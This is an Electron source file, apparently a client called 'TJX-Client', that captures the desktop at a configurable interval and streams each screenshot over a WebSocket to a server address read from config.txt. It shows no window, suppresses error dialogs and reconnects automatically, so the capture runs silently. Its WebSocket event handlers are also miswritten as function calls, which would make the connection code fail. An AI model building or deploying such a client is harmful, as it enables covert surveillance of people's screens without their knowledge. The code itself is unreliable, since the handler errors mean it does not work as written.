const { app, BrowserWindow } = require("electron");
const electron = require("electron");
const dialog = electron.dialog;

// Disable error dialogs by overriding
dialog.showErrorBox = function (title, content) {
  console.log(`${title}\n${content}`);
};

const { desktopCapturer } = require("electron");
const path = require("path");
const WebSocket = require("ws");
const fs = require("fs");

let socket = null;
let IP = "1.1.1.1:9999";
let clientName = "TJX-Client";
let sizePercentage = 40;
let intervalTime = 1000;

function ConnectToWS() {
  try {
    socket = new WebSocket(`ws://${IP}`);

    socket.onopen(function (event) {
      console.log("connected");
    });

    socket.onclose(function () {
      setTimeout(() => {
        ConnectToWS();
      }, 2000);
    });

    socket.onmessage(function (event) {
      console.log(event.data);
    });

    socket.onerror(function (event) {
      setTimeout(() => {
        ConnectToWS();
      }, 5000);
    });
  } catch (e) {
    setTimeout(() => {
      ConnectToWS();
    }, 5000);
  }
}

app.whenReady().then(() => {
  let configFilePath = path.join(__dirname, "config.txt");
  console.log(configFilePath);
  const configData = fs.readFileSync(configFilePath, "utf8");
  let configLines = configData
    .split("\n")
    .map((line) => line.split("=")[1].trim());
  IP = configLines[0];
  clientName = configLines[1];
  sizePercentage = parseFloat(configLines[2]);
  intervalTime = parseInt(configLines[3]);
  ConnectToWS();
  setInterval(() => {
    desktopCapturer
      .getSources({
        types: ["screen"],
        thumbnailSize: {
          width: 1920 * (sizePercentage / 100),
          height: 1080 * (sizePercentage / 100),
        },
      })
      .then((sources) => {
        let img = sources[0].thumbnail.toDataURL();
        // try {
        //   win.webContents.send("SEND_IMAGE", img);
        // } catch (e) {}
        try {
          socket.send(
            JSON.stringify({
              name: clientName,
              img: img,
              type: "img",
            })
          );
        } catch (e) {
          //console.log(e);
        }
      });
  }, intervalTime);
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});
